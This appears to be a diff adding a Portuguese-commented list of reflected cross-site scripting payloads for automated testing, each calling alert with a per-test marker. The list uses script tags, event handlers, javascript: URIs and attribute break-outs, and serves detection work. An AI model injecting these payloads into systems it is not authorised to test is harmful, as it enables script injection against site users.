@@ -1,0 +1,17 @@
+# Payloads de XSS refletido para teste automatizado.
+# "MARKER" e substituido por um identificador unico por teste.
+<script>alert(MARKER)</script>
+<img src=x onerror=alert(MARKER)>
+<svg onload=alert(MARKER)>
+"><script>alert(MARKER)</script>
+'><script>alert(MARKER)</script>
+<body onload=alert(MARKER)>
+<iframe src="javascript:alert(MARKER)"></iframe>
+<input onfocus=alert(MARKER) autofocus>
+<details open ontoggle=alert(MARKER)>
+javascript:alert(MARKER)
+"onmouseover="alert(MARKER)
+'-alert(MARKER)-'
+</textarea><script>alert(MARKER)</script>
+<marquee onstart=alert(MARKER)>
+<video><source onerror=alert(MARKER)>
